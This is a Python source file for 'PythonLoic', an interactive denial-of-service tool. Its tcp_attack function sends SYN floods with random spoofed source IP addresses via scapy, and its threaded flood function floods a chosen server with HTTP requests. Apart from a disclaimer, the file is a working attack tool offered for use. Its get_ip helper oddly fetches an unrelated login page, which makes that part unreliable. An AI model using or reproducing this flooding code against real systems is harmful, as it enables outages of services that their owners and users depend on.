from sys import stdout

def text_menu():
	try:
		import platform
	except ImportError:
		error = "Could not import platform"
		print(error)
		history_write(error)
	wrong_entry = 0
	help = '''
	________________________________________________________
	|SYN to send TCP packets with syn header (syn flood)---|
	|TCP to send tcp packets at a high speed, with multith-|
	|reading----------[NEW !]------------------------------|
	|PING just to ping a server----------------------------|
	|HISTORY to show history-------------------------------|
	|WHOAMI if you are amnesic-----------------------------|
	|IP to see your current ip adress----------------------|
	|______________________________________________________|'''
	current_os = platform.system()
	credits()
	while True:
		command = raw_input("PythonLoic $ ")
		if command == "help": 
			print (help)
		elif command == "ip":
			print (get_ip())
		elif command == "whoami":
			print (get_username())
		elif command == "ping":
			host = raw_input("Host : ")
			if current_os in "Linux":
				arg="-c"
			elif current_os in "Windows":
				arg="-n"
			nbr = raw_input("Number of ping : ")
			print(ping(host, arg, nbr))
		elif command == "credits":
			credits()
		elif command == "exit":
			quit()
		elif command == "history":
			history_read()
		elif command == "syn":
			nbr = int(raw_input("Number of packet : "))
			port = int(raw_input("Port : "))
			target = raw_input("Target : ")
			if tcp_attack(target, port, nbr) == 0:
				print("Done, %i packets sent" % nbr)
			else:
				print("Error running the script.\nDid you run the script as root ?")
		elif command == "tcp":
			thread_flood_config()
		else:
			wrong_entry += 1
			if wrong_entry == 3:
				print (help)
				wrong_entry = 0
				
def auto_send_request(server, port=80, number_of_requests=10):
	from socket import socket, AF_INET, SOCK_STREAM
	for z in range(number_of_requests):
		try:
			sock = socket(AF_INET, SOCK_STREAM)
			sock.connect((str(server), int(port)))
			sock.send("GET / HTTP/1.1\r\n\r\n")
			sock.close()
			stdout.write(".")
		except:
			stdout.write("E")
				
def flood(url, port=80, number_of_requests=1000, number_of_threads=100):
	from threading import Thread
	number_of_requests_per_thread = int(number_of_requests/number_of_threads)
	try:
		for x in range(number_of_threads):
			Thread(target=auto_send_request, args=(url, port, number_of_requests_per_thread)).start()
	except:
		stdout.write("\n[E]\n")
	print("\nDone %i requests on %s" % (number_of_requests, url))

def thread_flood_config():
	server = raw_input("Server: ").lower()
	port = input("port (80 is default) :")
	requests = input("Number of requests: ")
	speed = input("requests per second? ")
	flood(server, port, requests, speed)
	
def tcp_attack(target, port, nbr):
	try:
		from scapy.all import *
	except:
		print("Scapy importation error")
	try:
		import socket
		import random
		conf.iface='wlan0'
		ip = IP()
		try:
			ip.dst = socket.gethostbyname(target)
		except:
			print("Couldn't get the IP of the target")
		print("target IP : "+ip.dst)
		c = 0
		tcp = TCP()
		tcp.flags = 'S'
		tcp.dport = int(port)
		while c<=nbr:
			ip.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
			tcp.sport = RandShort()
			packet=ip/tcp
			send(packet, verbose=0)
			if c % 20 == 0:
				print(str(c*100/nbr)+" %")
			c += 1
		history_write("tcp %s\n" % target)
		return 0
	except:
		return 1

def history_read():
	try:
		history = open("history.log", "r")
		text = history.read()
		history.close()
		print(text)
		return text
	except:
		history = open("history.log", "w")
		history.close()

	
def get_ip():
	try:
		import urllib
		ip = urllib.urlopen("https://erp.cisin.com/login.asp").read()
		return ip
	except ImportError:
		error = "Could not import urllib"
		print(error)
		history_write(error)
	
def get_username():
	try:
		import getpass
		user = getpass.getuser()
		return user
	except ImportError:
		error = "Could not import getpass"
		print(error)
		history_write(error)
	
def ping(host, arg, nbr):
	try:
		import subprocess
		ping = subprocess.Popen(
		["ping", arg, nbr, host],
		stdout = subprocess.PIPE,
		stderr = subprocess.PIPE
		)
		out, error = ping.communicate()
		history_write("ping "+str(host))
		return out
	except ImportError:
		error = "Could not import subprocess"
		print(error)
		history_write(error)
	
def history_write(entry):
	try:
		history = open("history.log", "a")
		history.write(entry+"\n")
		history.close()
	except:
		print("Could not write history.log")
	
def credits():
	print("""/$$$$$$$              /$$     /$$                          
| $$__  $$            | $$    | $$                          
| $$  \ $$ /$$   /$$ /$$$$$$  | $$$$$$$   /$$$$$$  /$$$$$$$ 
| $$$$$$$/| $$  | $$|_  $$_/  | $$__  $$ /$$__  $$| $$__  $$
| $$____/ | $$  | $$  | $$    | $$  \ $$| $$  \ $$| $$  \ $$
| $$      | $$  | $$  | $$ /$$| $$  | $$| $$  | $$| $$  | $$
| $$      |  $$$$$$$  |  $$$$/| $$  | $$|  $$$$$$/| $$  | $$
|__/       \____  $$   \___/  |__/  |__/ \______/ |__/  |__/
           /$$  | $$                                        
          |  $$$$$$/                                        
           \______/                                         

 /$$        /$$$$$$  /$$$$$$  /$$$$$$ 
| $$       /$$__  $$|_  $$_/ /$$__  $$
| $$      | $$  \ $$  | $$  | $$  \__/
| $$      | $$  | $$  | $$  | $$      
| $$      | $$  | $$  | $$  | $$      
| $$      | $$  | $$  | $$  | $$    $$
| $$$$$$$$|  $$$$$$/ /$$$$$$|  $$$$$$/
|________/ \______/ |______/ \______/

	\n\nMade by Gautam Raaj\nWe are NOT responsible of what you do with this software. This software must NOT be sold""")

if __name__ == '__main__':
	text_menu()
